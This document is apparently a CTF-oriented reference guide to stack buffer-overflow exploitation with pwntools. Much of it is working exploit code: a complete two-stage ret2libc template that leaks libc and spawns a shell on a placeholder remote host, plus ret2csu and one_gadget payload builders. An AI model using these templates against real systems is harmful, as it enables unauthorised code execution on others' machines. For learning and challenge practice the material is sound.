# Stack-Based Exploitation (Stack Pwn)

## Trigger Conditions and Pre-checks

### checksec Interpretation

```bash
checksec --file=./vuln
# or using pwntools built-in function
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output Field | Impact | Mitigation |
|--------------|--------|------------|
| `NX disabled` | Stack executable | Directly inject shellcode |
| `Canary found` | Stack overflow will be detected | Must leak canary or bypass (forked process / format string) |
| `PIE enabled` | .text base randomized | Must leak a code address |
| `No PIE` | .text fixed | Hardcode gadget addresses |
| `Full RELRO` | got not writable | Cannot modify got, use ret2libc / one_gadget |
| `Partial RELRO` | got writable | Can modify got table |
| `FORTIFY` | Some libc functions replaced with `_chk` versions | `read_chk` can still overflow, but `strcpy_chk` cannot |

### Precise Stack Overflow Length Determination

```python
# pwntools cyclic pattern
from pwn import *
context.arch = 'amd64'

# 1. Generate cyclic pattern
payload = cyclic(200)

# 2. Feed the program to trigger crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Read RSP value from core dump
core = p.corefile
fault = core.fault_addr  # or core.rsp pointing to 8 bytes
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# For 64-bit, use cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32/64-Bit Calling Convention Quick Reference

| Architecture | Parameter Passing | Return | Notes |
|--------------|-------------------|--------|-------|
| x86 (32-bit) | Stack parameters (cdecl: caller cleans the stack) | eax | Stack structure: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at call entry |
| ARM32 | r0-r3, stack | r0 | lr saves return address, bx lr returns |
| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment requirements |

## Full pwntools Template for ret2libc

```python
#!/usr/bin/env python3
from pwn import *

# === Environment Configuration ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# Automatically patchelf to use the libc provided by the challenge locally
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: Leak libc ===
p = conn()

OFFSET = 0x48  # Found through cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # Used for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # Make puts print the address of puts@got
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # Return to main, reuse stack overflow for second round

p.sendlineafter(b'> ', payload)

# Receive leak (note recvuntil anchor string, don't use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# Reverse check libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # Critical:补齐 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack Alignment Pitfall (Must Read)

```text
Observation: Local connection works, but remote system call causes SIGSEGV upon entering
Reason: libc's system → do_system → internal movaps xmm0, [rsp]
        Requires rsp to be 16-byte aligned
Failure: Your ROP chain jumps into system when the least significant byte of rsp is 0x8 instead of 0x0
Fix: Insert a `ret` gadget in your ROP chain (consumes 8 bytes, re-aligns rsp)
```

## ret2csu (Universal Gadget)

When the binary does not have a `pop rdx; ret` gadget for the third parameter, use the fixed structure in `__libc_csu_init` (present in statically linked programs with glibc < 2.34).

```text
Fixed pattern at the end of __libc_csu_init:
    add rsp, 8
    pop rbx
    pop rbp
    pop r12
    pop r13
    pop r14
    pop r15
    ret

There is also:
    mov rdx, r15  ; r15 → rdx
    mov rsi, r14  ; r14 → rsi
    mov edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools code:

```python
csu_pop = 0x40119a  # First segment (pop rbx..r15; ret)
csu_call = 0x401180  # Second segment (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (to make subsequent cmp rbx,rbp pass → rbx+1 == rbp)
    p += p64(call_target)    # r12 = [r12+rbx*8] dereference to get the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # Second segment ret after popping 7 more
    return p
```

Applicable: Write a function pointer in the BSS and call it using CSU, often used to jump to the BSS for ROP after `read(0, bss, 0x100)`.

## one_gadget Usage

```bash
one_gadget ./libc.so.6

# Output similar to:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # Choose the one that satisfies the constraints
```

**Trap**: One_gadget is very difficult to satisfy in some libc versions (2.34+), so using ret2libc is more stable.

## libc-database Reverse Lookup

Scenario: The binary does not provide a libc, and you can only leak a few function addresses to infer the version.

```bash
cd ~/tools/libc-database

# Use the leaked puts and read addresses (last 3 digits) for reverse lookup
./find puts 0x6f0 read 0xfd
# Output: libc6_2.31-0ubuntu9.9_amd64

# Get all symbol offsets for the corresponding libc
./dump libc6_2.31-0ubuntu9.9_amd64

# Download the actual libc.so.6 to your local machine
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# Online libc-database query (no need for local installation)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget Cheat Sheet

```bash
# Basic: pop|ret single reg
ROPgadget --binary ./vuln --only "pop|ret"

# Find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# Find with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# Find string
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# Output JSON for program parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (wider architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote Stabilization Checklist

| Issue | Phenomenon | Solution |
|-------|------------|----------|
| Wrong libc version | Local works, remote SIGSEGV in system | Leak to check actual version using libc-database |
| Stack alignment | system crashes immediately | Add a `ret` gadget |
| Network latency | recv receives half of the data | Use `recvuntil(b'pivot string')`, not `sleep` |
| Buffering | sendline doesn't respond after sending | Change to `sendlineafter`, wait for prompt before sending |
| ASLR floating | Probable success | Check if byte-level brute works (1/16 probability is not stable) |
| TCP Nagle | Small packets merged | `p.settimeout(2); p.recvall(timeout=2)` as a fallback |

## Debugging Techniques

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# Run in gdb from the start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

GEF/pwndbg common commands:

```text
checksec               # Check protections
vmmap                  # Memory layout
telescope $rsp 30      # Stack trace (pwndbg)
stack 30               # Similar (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # Automatically display reg + stack + code (default on)
ropgadget              # Embedded gadget search
```

## Notes

- **NX on + ASLR off** is required to directly execute shellcode; modern binaries typically have NX enabled.
- **Canary remains unchanged in forked child processes** — forking servers can be brute-forced byte by byte (1/256 × 7 bytes).
- **Format string vulnerabilities can leak both canary and libc** — use `%p %p ... %p` to scan the stack.
- **DynELF is slow but universal** — when no libc is provided, pwntools' `DynELF` can byte-by-byte leak the symbol table using the program's own I/O primitives.
- **Static linked programs have no libc.got** — use SROP (sigreturn-oriented programming) or direct syscall.